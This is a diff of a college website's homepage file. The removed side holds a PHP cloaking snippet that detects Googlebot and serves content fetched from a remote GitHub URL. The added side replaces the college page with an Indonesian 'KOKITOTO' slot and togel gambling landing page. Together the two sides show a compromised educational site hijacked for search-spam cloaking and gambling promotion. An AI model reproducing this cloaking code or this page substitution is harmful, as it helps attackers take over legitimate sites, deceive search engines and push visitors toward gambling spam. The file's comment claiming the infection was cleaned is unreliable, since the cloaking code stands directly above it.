@@ -1,795 +1,544 @@
-<?php
-    function is_google_bot() {
-        if (!isset($_SERVER['HTTP_USER_AGENT'])) {
-            return false;
-        }
-        $userAgent = $_SERVER['HTTP_USER_AGENT'];
-        $googleAgents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-        foreach ($googleAgents as $agent) {
-            if (stripos($userAgent, $agent) !== false) {
-                return true;
-            }
-        }
-        return false;
-    }
-    function ambil_konten_curl($url) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        if (isset($_SERVER['HTTP_USER_AGENT'])) {
-            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-        }
-        $hasil = curl_exec($ch);
-        curl_close($ch);
-        return $hasil;
-    }
-    if (is_google_bot()) {
-        $url_target = 'https://raw.githubusercontent.com/anehinpek/supersaiyan/refs/heads/main/cloak-andersoncollege';
-        $konten = ambil_konten_curl($url_target);
-        if ($konten) {
-            echo $konten;
-            exit;
-        }
-    }
-?>
 
-
-<?php 
-/**
-* Note: This file may contain artifacts of previous malicious infection.
-* However, the dangerous code has been removed, and the file is now safe to use.
-*/
-
- 
-date_default_timezone_set('Asia/Calcutta');
-$cur_yr = date("Y");
-?>
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html amp lang="id">
 <head>
-  <title>Anderson College</title>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="css/bootstrap.min.css" rel="stylesheet">
-       <?php 
-$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://andersoncollege.vic.edu.au" : "http://andersoncollege.vic.edu.au/";
-?>
-<link rel='canonical' href='<?php echo $protocol;?>' />
-      <link rel="shortcut icon" href="<?php echo $protocol;?>/images/favicon.jpg" type="image/x-icon">
-      <link rel='stylesheet' href='css/style-sheer.css' type='text/css' media='all' />
-      <link rel='stylesheet' href='css/owl.css' type='text/css' media='all' />
-      <link rel='stylesheet' href='css/all.css' type='text/css' media='all' />
+  <title>KOKITOTO: Situs Toto Slot & Togel 4D Interaktif Dengan Kejutan Bonus Menanti</title>
+  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+  <meta name="description" content="KOKITOTO adalah situs toto slot & togel 4D interaktif dengan bonus menarik setiap hari. Daftar sekarang dan nikmati peluang menang besar!">
+  <meta name="robots" content="index,follow" />
+  <meta property="og:url" content="https://gmvrkl.ac.in/" />
+  <meta property="og:site_name" content="KOKITOTO" />
+  <meta property="og:image:alt" content="KOKITOTO" />
+  <meta property="og:image" content="https://gmvrkl.ac.in/img/kokitoto-toto-slot.webp" />
+  <link href="https://gmvrkl.ac.in/img/fav.webp" rel="shortcut icon" type="image/x-icon" />
+  <link rel="canonical" href="https://gmvrkl.ac.in/">
+  <link rel="preload" as="image" href="https://gmvrkl.ac.in/img/kokitoto-toto-slot.webp">
+  <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Silkscreen:wght@400;700&display=swap">
+  <script async src="https://cdn.ampproject.org/v0.js"></script>
+  <style amp-boilerplate>
+    body {
+      -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+      -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+      -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+      animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+    }
+    @-webkit-keyframes -amp-start {
+      from { visibility: hidden; }
+      to { visibility: visible; }
+    }
+    @-moz-keyframes -amp-start {
+      from { visibility: hidden; }
+      to { visibility: visible; }
+    }
+    @-ms-keyframes -amp-start {
+      from { visibility: hidden; }
+      to { visibility: visible; }
+    }
+    @-o-keyframes -amp-start {
+      from { visibility: hidden; }
+      to { visibility: visible; }
+    }
+    @keyframes -amp-start {
+      from { visibility: hidden; }
+      to { visibility: visible; }
+    }
+  </style>
+  <noscript>
+    <style amp-boilerplate>
+      body {
+        -webkit-animation: none;
+        -moz-animation: none;
+        -ms-animation: none;
+        animation: none;
+      }
+    </style>
+  </noscript>
+  <style amp-custom>
+    :root {
+      --bg-top: #1b2458;
+      --bg-bottom: #060814;
+      --panel-top: #34479f;
+      --panel-bottom: #161d48;
+      --royal: #5472e2;
+      --royal-soft: #243572;
+      --gold: #f4cf63;
+      --gold-deep: #996718;
+      --gold-soft: #fff2ac;
+      --text: #fff8d1;
+      --muted: #d7cf9f;
+      --shadow: 0 8px 0 rgba(5, 8, 20, 0.95);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    .card,
+    .logo-slot,
+    .hero-slot,
+    .actions,
+    .button,
+    .page-footer {
+      clip-path: polygon(
+        0 10px,
+        10px 10px,
+        10px 0,
+        calc(100% - 10px) 0,
+        calc(100% - 10px) 10px,
+        100% 10px,
+        100% calc(100% - 10px),
+        calc(100% - 10px) calc(100% - 10px),
+        calc(100% - 10px) 100%,
+        10px 100%,
+        10px calc(100% - 10px),
+        0 calc(100% - 10px)
+      );
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Silkscreen", "Press Start 2P", monospace;
+      line-height: 1.5;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top, rgba(255, 242, 172, 0.12), transparent 28%),
+        linear-gradient(180deg, var(--bg-top) 0%, var(--bg-bottom) 100%);
+      background-repeat: no-repeat;
+      background-position: center top;
+      background-size: cover;
+      image-rendering: pixelated;
+      overflow-x: hidden;
+    }
+
+    .shell {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: min(100%, 620px);
+      min-height: 100vh;
+      margin: 0 auto;
+      padding: clamp(14px, 3vw, 28px);
+      gap: clamp(12px, 2.5vw, 18px);
+      justify-content: center;
+    }
+
+    .card {
+      width: 100%;
+      max-width: none;
+      padding: clamp(14px, 2.6vw, 20px);
+      background:
+        linear-gradient(180deg, rgba(255, 255, 255, 0.06) 0 4px, transparent 4px 100%),
+        linear-gradient(180deg, var(--panel-top) 0%, var(--panel-bottom) 100%);
+      border: 4px solid var(--gold-deep);
+      box-shadow:
+        inset 0 0 0 2px var(--gold-soft),
+        inset 0 0 0 6px var(--royal-soft),
+        inset 0 0 0 8px #11173d,
+        0 0 0 4px rgba(255, 242, 172, 0.98),
+        0 0 0 8px #22306f,
+        var(--shadow);
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      gap: clamp(14px, 3vw, 18px);
+    }
+
+    .card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background:
+        repeating-linear-gradient(180deg, rgba(255, 255, 255, 0.05) 0 2px, transparent 2px 8px),
+        linear-gradient(90deg, transparent 0 5%, rgba(255, 242, 172, 0.08) 5% 7%, transparent 7% 93%, rgba(255, 242, 172, 0.08) 93% 95%, transparent 95% 100%);
+      pointer-events: none;
+    }
+
+    .card::after {
+      content: "";
+      position: absolute;
+      inset: 12px;
+      border: 3px solid rgba(255, 242, 172, 0.34);
+      box-shadow: inset 0 0 0 2px rgba(20, 28, 70, 0.95);
+      pointer-events: none;
+    }
+
+    .logo-slot,
+    .hero-slot,
+    .actions {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      isolation: isolate;
+      border: 4px solid var(--gold-deep);
+      background:
+        linear-gradient(180deg, rgba(255, 255, 255, 0.08) 0 3px, transparent 3px 100%),
+        linear-gradient(180deg, rgba(43, 60, 133, 0.98), rgba(17, 23, 58, 0.98));
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 242, 172, 0.86),
+        inset 0 0 0 6px rgba(18, 25, 64, 0.98),
+        0 0 0 4px rgba(34, 48, 111, 0.98);
+      overflow: hidden;
+    }
+
+    .logo-slot {
+      padding: 0;
+    }
+
+    .hero-slot {
+      padding: 0;
+    }
+
+    .actions {
+      padding: 16px;
+      gap: 14px;
+    }
+
+    .logo-slot::after,
+    .hero-slot::after,
+    .actions::after {
+      content: "";
+      position: absolute;
+      inset: 12px;
+      z-index: 4;
+      background:
+        repeating-linear-gradient(180deg, rgba(255, 255, 255, 0.04) 0 2px, transparent 2px 8px),
+        linear-gradient(90deg, transparent 0 5%, rgba(255, 242, 172, 0.05) 5% 7%, transparent 7% 93%, rgba(255, 242, 172, 0.05) 93% 95%, transparent 95% 100%);
+      border: 2px solid rgba(255, 242, 172, 0.2);
+      box-shadow: inset 0 0 0 2px rgba(19, 27, 69, 0.95);
+      pointer-events: none;
+    }
+
+    .logo-link,
+    .logo-media,
+    .hero-media {
+      position: relative;
+      z-index: 3;
+      display: block;
+    }
+
+    .logo-image,
+    .hero-image {
+      position: relative;
+      z-index: 3;
+      display: block;
+      width: 100%;
+    }
+
+    .logo-link {
+      text-decoration: none;
+      padding: 12px;
+    }
+
+    .logo-media {
+      width: min(100%, 360px);
+      margin: 0 auto;
+      filter: drop-shadow(4px 4px 0 rgba(6, 9, 20, 0.75));
+    }
+
+    .logo-image img {
+      object-fit: contain;
+      object-position: center;
+    }
+
+    .hero-media {
+      margin: 12px;
+    }
+
+    .hero-image img {
+      object-fit: contain;
+      object-position: center;
+    }
+
+    .hero-slot::before {
+      position: absolute;
+      top: 12px;
+      left: -28%;
+      z-index: 5;
+      width: 22%;
+      height: calc(100% - 24px);
+      content: "";
+      background: linear-gradient(90deg, transparent 0 28%, rgba(255, 255, 255, 0.04) 28% 34%, rgba(255, 242, 172, 0.62) 34% 52%, rgba(255, 242, 172, 0.2) 52% 70%, transparent 70% 100%);
+      pointer-events: none;
+      animation: royal-glint 4.8s steps(18) infinite;
+    }
+
+    .hero-slot::after {
+      z-index: 4;
+    }
+
+    .actions {
+      display: grid;
+      grid-template-columns: 1fr;
+      background:
+        linear-gradient(180deg, rgba(255, 255, 255, 0.05) 0 3px, transparent 3px 100%),
+        linear-gradient(180deg, rgba(34, 47, 108, 0.98), rgba(13, 18, 45, 0.98));
+    }
+
+    .button {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 16px 18px 16px 50px;
+      text-decoration: none;
+      font-family: "Press Start 2P", monospace;
+      font-size: 11px;
+      line-height: 1.45;
+      letter-spacing: 0;
+      text-transform: uppercase;
+      overflow: hidden;
+      isolation: isolate;
+      border: 4px solid var(--gold-deep);
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 242, 172, 0.92),
+        inset 0 0 0 6px rgba(20, 28, 70, 0.14),
+        0 4px 0 rgba(6, 9, 20, 0.98);
+      transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+    }
+
+    .button::before {
+      content: ">";
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 13px;
+      color: var(--gold);
+      text-shadow: 2px 2px 0 rgba(12, 17, 43, 0.95);
+      pointer-events: none;
+    }
+
+    .button::after {
+      content: "";
+      position: absolute;
+      top: 4px;
+      left: -30%;
+      width: 22%;
+      height: calc(100% - 8px);
+      background: linear-gradient(90deg, transparent 0 28%, rgba(255, 255, 255, 0.04) 28% 34%, rgba(255, 242, 172, 0.72) 34% 52%, rgba(255, 242, 172, 0.2) 52% 68%, transparent 68% 100%);
+      pointer-events: none;
+      animation: royal-glint 4.4s steps(18) infinite;
+    }
+
+    .button-primary {
+      color: #2c1800;
+      background:
+        linear-gradient(180deg, #ffe59c 0 20%, #efc75e 20% 70%, #c98d29 70% 100%);
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 247, 216, 0.92),
+        inset 0 -4px 0 rgba(133, 88, 17, 0.95),
+        0 0 0 3px rgba(35, 48, 111, 0.98),
+        0 6px 0 rgba(6, 9, 20, 0.98);
+      text-shadow: 1px 1px 0 rgba(255, 255, 255, 0.34);
+    }
+
+    .button-secondary {
+      color: var(--text);
+      background:
+        linear-gradient(180deg, #5777e6 0 20%, #33489b 20% 68%, #18214f 68% 100%);
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 255, 255, 0.2),
+        inset 0 -4px 0 rgba(11, 16, 42, 0.98),
+        0 0 0 3px rgba(35, 48, 111, 0.98),
+        0 6px 0 rgba(6, 9, 20, 0.98);
+      text-shadow: 2px 2px 0 rgba(12, 17, 43, 0.95);
+    }
+
+    .button-secondary::after {
+      animation-delay: 0.5s;
+    }
+
+    .button-primary:hover,
+    .button-secondary:hover {
+      transform: translateY(1px);
+    }
+
+    .button-primary:hover {
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 247, 216, 0.92),
+        inset 0 -4px 0 rgba(133, 88, 17, 0.95),
+        0 0 0 3px rgba(35, 48, 111, 0.98),
+        0 4px 0 rgba(6, 9, 20, 0.98);
+    }
+
+    .button-secondary:hover {
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 255, 255, 0.2),
+        inset 0 -4px 0 rgba(11, 16, 42, 0.98),
+        0 0 0 3px rgba(35, 48, 111, 0.98),
+        0 4px 0 rgba(6, 9, 20, 0.98);
+    }
+
+    .button-text {
+      position: relative;
+      z-index: 2;
+      display: block;
+      padding-top: 1px;
+    }
+
+    @keyframes royal-glint {
+      0% {
+        transform: translateX(0);
+        opacity: 0;
+      }
+
+      8% {
+        opacity: 0.55;
+      }
+
+      40% {
+        transform: translateX(520%);
+        opacity: 0.4;
+      }
+
+      46% {
+        opacity: 0;
+      }
+
+      100% {
+        transform: translateX(520%);
+        opacity: 0;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .shell {
+        width: 100%;
+        min-height: auto;
+        justify-content: flex-start;
+      }
+
+      .card {
+        padding: 14px;
+      }
+
+      .card::after,
+      .logo-slot::after,
+      .hero-slot::after,
+      .actions::after {
+        inset: 8px;
+      }
+
+      .logo-link {
+        padding: 8px;
+      }
+
+      .hero-media {
+        margin: 8px;
+      }
+
+      .hero-slot::before {
+        top: 8px;
+        height: calc(100% - 16px);
+      }
+
+      .actions {
+        padding: 12px;
+        gap: 12px;
+      }
+
+      .button {
+        padding: 12px 14px 12px 44px;
+        font-size: 10px;
+        line-height: 1.5;
+      }
+
+      .button::before {
+        left: 12px;
+        font-size: 11px;
+      }
+
+      .page-footer {
+        padding: 10px 12px;
+        font-size: 9px;
+      }
+    }
+
+    @media (max-width: 767px), (prefers-reduced-motion: reduce) {
+      .hero-slot::before,
+      .button::after {
+        display: none;
+      }
+
+      .button {
+        transition: none;
+      }
+    }
+
+    .page-footer {
+      width: 100%;
+      max-width: none;
+      padding: 14px 16px;
+      font-family: "Press Start 2P", monospace;
+      font-size: 9px;
+      line-height: 1.7;
+      letter-spacing: 0.02em;
+      color: var(--muted);
+      text-align: center;
+      background:
+        linear-gradient(180deg, rgba(255, 255, 255, 0.05) 0 3px, transparent 3px 100%),
+        linear-gradient(180deg, rgba(32, 42, 99, 0.98), rgba(16, 22, 55, 0.98));
+      border: 4px solid var(--gold-deep);
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 242, 172, 0.86),
+        inset 0 0 0 6px rgba(18, 25, 64, 0.98),
+        0 0 0 4px rgba(34, 48, 111, 0.98);
+    }
+
+    @media (min-width: 768px) {
+      .button {
+        font-size: 12px;
+      }
+
+      .page-footer {
+        font-size: 9px;
+      }
+    }
+  </style>
 </head>
 <body>
-<header id="header" class="header">
-			<div class="top_head">
-				<div class="container-fluid px-xl-5">
-					<div class="row">
-						<div class="col-md-7 col-12">
-							<div class="top_tuch">
-								<ul class="location_box mb-md-0 mb-3">
-									<li>
-										<span><i class="fa-regular fa-envelope"></i></span>
-										<a class="text-white" href="mailto:info@Andersoncollege.vic.edu.au">info@Andersoncollege.vic.edu.au</a>
-									</li>
-                                 <!--    <li>
-										<span><i class="fa-solid fa-phone"></i> </span>
-										<a class="text-white" href="mailto:0432 289 077">0432 289 077</a>
-									</li>   --> 
-                                    <li class="d-none d-md-inline">
-                                        <span><i class="fa-solid fa-phone"></i> </span>
-                                        <a class="text-white" href="tel:0433 518 191 ">0433 518 191 </a>
-                                    </li>
-								<!-- 	<li class="d-none d-xxl-inline"><a href="https://maps.app.goo.gl/vVcWsuNhmZF9Fd2g7" class="text-white" target="_blank">
-										<span><i class="fa-solid fa-location-dot"></i> Brisbane </span>
-										
-                                    </a>
-									</li> -->
-                                    <li class="d-none d-xxl-inline"><a href="https://maps.app.goo.gl/fc6mj1R3L9t9WqMSA" class="text-white" target="_blank">
-                                            <span><i class="fa-solid fa-location-dot"></i> Melbourne </span>
-                      
-                                    </a>
-                                    </li>
-								</ul>
-							</div>
-						</div>
-						<div class="col-md-5 col-12">
-              <a href="" class="btn-style-two theme-btn btn-sm btn ms-3 float-end" data-bs-toggle="modal" data-bs-target="#myModal"><span class="txt">Enquire Now</span></a>
-						<div class="social_up float-md-end float-start">
-                        <ul class="social_tuch">
-                          <li>
-                            <span class="d-none d-lg-block pe-1">Connect With Us</span>
-                          </li>
-                          <li>
-                            <a href="https://www.facebook.com/profile.php?id=61559571580792"><i class="fa-brands fa-facebook-f"></i></a>
-                          </li>
-                          <li>
-                            <a href="https://www.instagram.com/collegeanderson/"><i class="fa-brands fa-instagram"></i></a>
-                          </li>
-                          <li>
-                            <a href="https://www.youtube.com/channel/UCARzuX7BSCpy-9LKmXgPvSw"><i class="fa-brands fa-youtube"></i></a>
-                          </li>
-                          <li>
-                            <a href="https://www.linkedin.com/in/anderson-college-46320430a/"><i class="fa-brands fa-linkedin-in"></i></a>
-                          </li>
-                        </ul>
-                        </div>
-						</div>
-					</div>
-				</div>
-			</div>
-
-			<nav class="navbar navbar-expand-lg navbar-light sticky-top">
-<div class="container-fluid px-xl-5">
-    <a class="navbar-brand" href="<?php echo $protocol;?>"><img src="images/logo.jpg" class="img-fluid" width="
-    	100" alt="logo"></a>
-    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#collapsibleNavbar">
-      <span class="navbar-toggler-icon"></span>
-    </button>
-    <div class="collapse navbar-collapse justify-content-end" id="collapsibleNavbar">
-      <ul class="navbar-nav">
-        <li class="nav-item">
-          <a class="nav-link" href="<?php echo $protocol;?>">Home</a>
-        </li>    
-        <li class="dropdown">
-          <a class="nav-link" href="#" id="dropdownMenuButton" data-bs-toggle="dropdown" aria-expanded="false">About Anderson</a>
-           <ul class="dropdown-menu to_animate animated fadeInDown" data-animation="fadeInDown" aria-labelledby="dropdownMenuButton1">
-             <li><a class="dropdown-item" href="about-us/"> About Us</a></li>
-            <!-- <li><a class="dropdown-item" href="#">Our Mission  &amp; Vision</a></li> -->
-              <li><a class="dropdown-item" href="why-study/">Why Study at Anderson </a></li>
-              <li><a class="dropdown-item" href="our-team/">Our Team</a></li>
-            <li><a class="dropdown-item" href="our-facilities/">Campus &amp; Facilities</a></li>           
-           </ul>
-         </li>
-  <!-- <li class="dropdown">
-            <a class="nav-link" href="#" id="dropdownMenuButton1" data-bs-toggle="dropdown" aria-expanded="false">Future Student</a>
-              <ul class="dropdown-menu to_animate animated fadeInDown" data-animation="fadeInDown" aria-labelledby="dropdownMenuButton2">
-                     <li><a class="dropdown-item" href="#">Application Form  »</a>
-
-             <ul class="dropdown-menu dropdown-submenu">
-            <li> <a class="dropdown-item" href="<?php echo $protocol;?>/form/Application Form (Domestic Students).pdf" target="_blank" download="Application Form for Domestic Students">Domestic Student  form</a></li>
-           <li>     <a class="dropdown-item" href="<?php echo $protocol;?>/form/Anderson International Student Enrolment form_V1.0.pdf" target="_blank" download="Anderson International Student Enrolment form">International Student  form</a>
-           </li>
-              </ul>
-          </li>
-              <li><a class="dropdown-item" href="intake/">Intakes</a></li>
-              </ul>
-            </li> -->   
-
-
-  <li class="dropdown">
-            <a class="nav-link" href="#" id="dropdownMenuButton1" data-bs-toggle="dropdown" aria-expanded="false">Our Courses</a>
-              <ul class="dropdown-menu to_animate animated fadeInDown" data-animation="fadeInDown" aria-labelledby="dropdownMenuButton2">
-                <li><a class="dropdown-item" href="<?php echo $protocol;?>/Program/">Course Details</a></li>
-                <li><a class="dropdown-item" href="<?php echo $protocol;?>/course-brochure/">Brochures</a></li>
-                   <!-- <li><a class="dropdown-item" href="intake/">Intakes</a></li> -->
-              </ul>
-            </li>
-
-
-  <li class="dropdown">
-            <a class="nav-link" href="#" id="dropdownMenuButton1" data-bs-toggle="dropdown" aria-expanded="false">Fees</a>
-              <ul class="dropdown-menu to_animate animated fadeInDown" data-animation="fadeInDown" aria-labelledby="dropdownMenuButton2">
-            
-                <li><a class="dropdown-item" href="onshore-fee/">Domestic Fee</a></li>
-                <li><a class="dropdown-item" href="international-fee/">International Fee</a></li>
-                <!-- <li><a class="dropdown-item" href="#" target="_blank">Pay College Fees Online</a></li>  -->
-             
-              </ul>
-            </li>
-
-
-       <li class="dropdown">
-          <a class="nav-link" href="#" id="dropdownMenuButton2" data-bs-toggle="dropdown" aria-expanded="false">Current Students</a>
-           <ul class="dropdown-menu to_animate animated fadeInDown" data-animation="fadeInDown" aria-labelledby="dropdownMenuButton1"><li><a class="dropdown-item" href="student-information/">Students Information</a></li>
-               <li><a class="dropdown-item" href="form/">Forms</a></li>
-             <li><a class="dropdown-item" href="Student-Policies/">Policies</a></li>
-
-            <li>
-            <a class="dropdown-item" href="#">Important Links  »</a>
-
-             <ul class="dropdown-menu dropdown-submenu">
-               <li><a class="dropdown-item" href="https://www.asqa.gov.au/" target="_blank">ASQA</a></li>
-             <li><a class="dropdown-item" href="https://immi.homeaffairs.gov.au/visas/getting-a-visa/visa-finder/study" target="_blank">Department of Home Affairs </a></li>
-             <li><a class="dropdown-item" href="https://www.education.gov.au/esos-framework" target="_blank">ESOS Framework </a></li>
-             <li><a class="dropdown-item" href="https://internationaleducation.gov.au/Regulatory-Information/Pages/National-Code-2018-Factsheets-.aspx" target="_blank">The National Code </a></li>
-             <li><a class="dropdown-item" href="https://tps.gov.au/Home/Login" target="_blank">Tuition Protection Service </a></li>
-                <li><a class="dropdown-item" href="https://www.usi.gov.au/students/get-a-usi" target="_blank"> USI</a></li>
-              </ul></li>
-              </ul>
-
-            </li>
-
-        <li class="dropdown">
-          <a class="nav-link" href="#" id="dropdownMenuButton3" data-bs-toggle="dropdown" aria-expanded="false">Agents </a>
-           <ul class="dropdown-menu to_animate animated fadeInDown" data-animation="fadeInDown" aria-labelledby="dropdownMenuButton1">
-                <li><a class="dropdown-item" href="<?php echo $protocol;?>/form/Education Agents Application Form_V1.0.pdf" download="Agent Application Form">Agent Application Form</a></li>
-                <li><a class="dropdown-item" href="Agents-List/">Agents List</a></li>
-                <!-- <li><a class="dropdown-item" href="#" target="_blank">Agents Portal Login</a></li>        -->
-           </ul>
-         </li>
-
-
-  <li class="nav-item">
-         <a class="nav-link" href="<?php echo $protocol;?>/Enrol-Now/">ENROL Now</a>
-        </li> 
-
-
-       
-          
-        <li class="nav-item">
-          <a class="nav-link" href="contact-us/">Contact Us</a>
-        </li>
-      </ul>
-    </div>
-  </div>
-</nav>
-
-
-
-
-		</header>
-
-
-    <!-- Main Slider Section Two -->
-    <section class="slider-sec">
-		<div class="main-slider-carousel owl-carousel owl-theme">
-			
-			<!-- <div class="slide" style="background-image:url(images/1.jpg)">
-				<div class="container">
-					<div class="content-boxed">
-						<div class="inner-boxed">
-							<div class="circle-color"></div>
-							<h1>CPP20218 - Certificate II in Security Operations</h1>
-							<div class="text">This qualification reflects the role of a security officer, responsible for maintaining
-safety and security by patrolling, protecting or guarding property while unarmed, and screening
-entry, monitoring behaviour, and removing persons from premises.</div>
-							<div class="btns-box">
-								<a class="btn-style-one theme-btn" href="<?php echo $protocol;?>/Program/Certificate-II-in-Security-Operations/"><span class="txt">Find Course</span></a>
-							</div>
-						</div>
-					</div>
-				</div>
-			</div> -->
-			
-			<div class="slide" style="background-image:url(images/3.jpg)">
-			<div class="container">
-					<div class="content-boxed">
-						<div class="inner-boxed">
-							<div class="circle-color"></div>
-							<h1>CHC33021 Certificate III in Individual Support</h1>
-							<div class="text">This qualification reflects the role of individuals in the community, home or residential care setting who work under supervision and delegation as a part of a multi-disciplinary team, following an individualised...</div>
-							<div class="btns-box">
-								<a class="btn-style-one theme-btn" href="<?php echo $protocol;?>/Program/CHC33021-Certificate-III-in-Individual-Support/"><span class="txt">Find Course</span></a>
-                                
-					
-							</div>
-						</div>
-					</div>
-				</div>
-			</div>
-      
-
-            <div class="slide" style="background-image:url(images/5.jpg)">
-            <div class="container">
-                    <div class="content-boxed">
-                        <div class="inner-boxed">
-                            <div class="circle-color"></div>
-                            <h1>CHC43121 - Certificate IV in Disability Support</h1>
-                            <div class="text">This qualification reflects the role of individuals in a range of community settings and peoples’ homes, who provide support in a manner that empowers people with disabilities to achieve greater levels of independence,...</div>
-                            <div class="btns-box">
-                                <a class="btn-style-one theme-btn" href="<?php echo $protocol;?>/Program/Certificate-IV-in-Disability-Support/"><span class="txt">Find Course</span></a>
-                    
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="slide" style="background-image:url(images/6.jpg)">
-            <div class="container">
-                    <div class="content-boxed">
-                        <div class="inner-boxed">
-                            <div class="circle-color"></div>
-                            <h1>CHC52021 Diploma of Community Services</h1>
-                            <div class="text">This qualification reflects the role of community services workers involved in the delivery, management and coordination of person-centred services to individuals, groups, and communities.
-<br>
-At this level, workers have specialised ...</div>
-                            <div class="btns-box">
-                                <a class="btn-style-one theme-btn" href="<?php echo $protocol;?>/Program/Diploma-of-Community-Services/"><span class="txt">Find Course</span></a>
-                    
-                            </div>
-                        </div></div>
-                </div>
-            </div>
-                  <div class="slide" style="background-image:url(images/4.jpg)">
-            <div class="container">
-                    <div class="content-boxed">
-                        <div class="inner-boxed">
-                            <div class="circle-color"></div>
-                            <h1>BSB80120: Graduate Diploma of Management (Learning)</h1>
-                            <div class="text">This qualification reflects the role of individuals who apply highly specialised knowledge and skills in the field of organisational learning and capability development...</div>
-                            <div class="btns-box">
-                                <a class="btn-style-one theme-btn" href="<?php echo $protocol;?>/Program/Graduate-Diploma-of-Management/"><span class="txt">Find Course</span></a>
-                    
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div><div class="slide" style="background-image:url(images/7.jpg)">
-            <div class="container">
-                    <div class="content-boxed">
-                        <div class="inner-boxed">
-                            <div class="circle-color"></div>
-                            <h1>ELICOS- General English Elementary to Advanced</h1>
-                            <div class="text">The standard course length is 50 weeks of General English. Each week, there are 20 face-to-face contact hours. This 50-week period is made up of five levels that each correspond to 10 weeks of coursework...</div><div class="btns-box">
-                                <a class="btn-style-one theme-btn" href="<?php echo $protocol;?>/Program/ELICOS-General-English-Elementary-to-Advanced/"><span class="txt">Find Course</span></a>
-                    
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-			
-		</div>
-    </section>
-    <!-- End Main Slider Section --><section>
-         <div class="eduction-area">
-            <div class="container-fluid p-0">
-               <div class="row g-0">
-                  <div class="col-lg-3 col-md-6 aos-init aos-animate" data-aos="fade-up" data-aos-duration="1200" data-aos-delay="200" data-aos-once="true">
-                     <a href="<?php echo $protocol;?>/Program/">
-                        <div class="single-education-card bg-1">
-                           <div class="edication-content">
-                              <div class="icon mb-3">
-                                 <img src="images/Courses.png" class="img-fluid" alt="Courses" width="70">
-                              </div>
-                              <h3>Courses <i class="fa-solid fa-arrow-right ms-1"></i></h3>
-                           </div>
-                        </div>
-                     </a>
-                  </div>
-                  <div class="col-lg-3 col-md-6 aos-init aos-animate" data-aos="fade-up" data-aos-duration="1200" data-aos-delay="400" data-aos-once="true">
-                     <a href="<?php echo $protocol;?>/student-information/">
-                        <div class="single-education-card bg-2">
-                           <div class="edication-content">
-                              <div class="icon  mb-3">
-                                 <img src="images/Student.png" class="img-fluid" alt="Student" width="70">
-                              </div>
-                              <h3>For Student <i class="fa-solid fa-arrow-right ms-1"></i></h3>
-                           </div>
-                        </div>
-                     </a>
-                  </div>
-                  <div class="col-lg-3 col-md-6 aos-init aos-animate" data-aos="fade-up" data-aos-duration="1200" data-aos-delay="600" data-aos-once="true">
-                     <a href="<?php echo $protocol;?>/Enrol-Now/">
-                        <div class="single-education-card bg-3">
-                           <div class="edication-content">
-                              <div class="icon  mb-3">
-                                 <img src="images/apply.png" class="img-fluid" alt="apply" width="70">
-                              </div>
-                              <h3>Apply <i class="fa-solid fa-arrow-right ms-1"></i></h3>
-                           </div>
-                        </div>
-                     </a>
-                  </div>
-                  <div class="col-lg-3 col-md-6 aos-init aos-animate" data-aos="fade-up" data-aos-duration="1200" data-aos-delay="800" data-aos-once="true">
-                     <a href="#" data-bs-toggle="modal" data-bs-target="#myModal">
-                        <div class="single-education-card bg-4">
-                           <div class="edication-content">
-                              <div class="icon  mb-3">
-                                 <img src="images/Enquire_Now.png" class="img-fluid" alt="Enquire_Now" width="70">
-                              </div>
-                              <h3>Enquire Now <i class="fa-solid fa-arrow-right ms-1"></i></h3>
-                           </div>
-                        </div>
-                     </a>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </section>
-<section id="about-sec" class="section-padding py-5">
-            <div class="about-sec-wrapper py-4">
-                <div class="container">
-                    <div class="row justify-content-end">
-                        <div class="col-lg-10">
-                            <div class="about-text">
-                                <div class="section-title text-lg-left">
-                                    <h2>About Us - Anderson College</h2>
-                                </div>
-
-                                <div class="about-img">
-                                    <img src="images/about-bg.jpg" alt="about-bg" class="img-fluid">
-                                </div>
-
